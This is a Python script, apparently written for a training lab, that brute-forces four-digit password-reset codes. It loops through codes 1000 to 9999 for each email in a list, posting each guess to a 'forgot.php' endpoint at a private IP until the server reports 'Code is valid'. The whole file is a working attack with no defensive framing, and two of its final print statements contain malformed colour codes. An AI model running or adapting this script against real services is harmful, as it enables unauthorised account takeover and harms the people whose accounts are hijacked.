import sys
import time
from bs4 import BeautifulSoup
import requests

error_logged = False

def check_code(code, email, url, headers, data_template):
    data = data_template.copy()
    data['code'] = code
    data['email'] = email

    try:
        response = requests.post(url, headers=headers, data=data)
        response.raise_for_status()  # Check for HTTP 4xx/5xx errors

        if response.status_code == 200:
            if 'No account found with that email' in response.text:
                print(f"\033[91m[ERROR]\033[0m No account found for email: {email}")
                return None
            else:
                if response.headers.get('Content-Type') == 'application/json':
                    return response.json()
                else:
                    print(f"\033[91m[ERROR]\033[0m Non-JSON response received: {response.text}")
                    return None
        else:
            print(f"\033[91m[ERROR]\033[0m Unexpected status code: {response.status_code}")
            return None
    except requests.exceptions.JSONDecodeError:
        global error_logged
        if not error_logged:
            print(f"\033[91m[ERROR]\033[0m JSON decode error encountered.")
            error_logged = True
        return None
    except requests.exceptions.RequestException as e:
        if not error_logged:
            print(f"\033[91m[ERROR]\033[0m Request failed: {e}")
            error_logged = True
        return None

def guess_codes(url, headers, data_template, valid_message, emails):
    global error_logged
    error_logged = False
    valid_codes = []

    for email in emails:
        print(f"\033[96m[INFO]\033[0m Starting code guessing for email: {email}")
        code = 1000

        while True:
            response_json = check_code(str(code), email, url, headers, data_template)
            if response_json and 'status' in response_json and 'message' in response_json:
                if valid_message in response_json['message']:
                    valid_codes.append((email, code))
                    print(f"\033[92m[VALID CODE FOUND]\033[0m Code: {code}, Email: {email}")
                    break
                else:
                    print(f"\033[93m[INVALID]\033[0m Code: {code}, Email: {email}")
                    code += 1
            else:
                print(f"\033[94m[NO RESPONSE]\033[0m Code: {code}, Email: {email}")
                break
            if code >= 9999:
                break
    if valid_codes:
        print("\033[92m[SUCCESS]\033[0m Valid codes found:")
        for email, code in valid_codes:
            print(f"Email: {email}, Valid Code: {code}")
    else:
        print("\033[91m[FAILED]\033[0m No valid code found.")
    return valid_codes

def check_website(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print("\033[92m[INFO]\033[0m Website is up and running.")
            return True
        else:
            print(f"\033[91m[ERROR]\033[0m Website returned status code {response.status_code}.")
            return False
    except requests.exceptions.RequestException as e:
        print(f"\033[91m[ERROR]\033[0m Failed to access the website: {e}")
        return False

def load_emails_from_file(file_path):
    try:
        with open(file_path, 'r') as f:
            emails = f.read().splitlines()
        print(f"Loaded emails: {emails}")
        return emails
    except FileNotFoundError:
        print(f"\033[91m[ERROR]\033[0m The file '{file_path}' was not found.")
        return []
    except Exception as e:
        print(f"\033[91m[ERROR]\033[0m Error reading the file: {e}")
        return []

if __name__ == "__main__":

    url = 'http://10.10.179.112/labs/predictable_tokens/forgot.php'
    email_file = 'emails.txt'
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    }
    data_template = {
        'code': '',
        'function': 'verify_code'
    }
    valid_message = "Code is valid"

    emails = load_emails_from_file(email_file)

    if not emails:
        print("\033[91m[ERROR]\033[0m No emails found, exiting the script.")
        sys.exit(1)

    if check_website(url):
        print("\033[96m[INFO]\033[0m Starting code guessing...")
        valid_codes = guess_codes(url, headers, data_template, valid_message, emails)

        if valid_codes:
            print(f"\n\033[92m[SUCCESS]\033[0m Valid codes found for the following emails:")
            for email, code in valid_codes:
                print(f"Email: {email}, Valid Code: {code}")
        else:
            print("\n\033[91m[FAILED]\133[m] No valid code found.")
    else:
        print("\033[91m[ERROR]\133[m] Website is down. Exiting the script.")
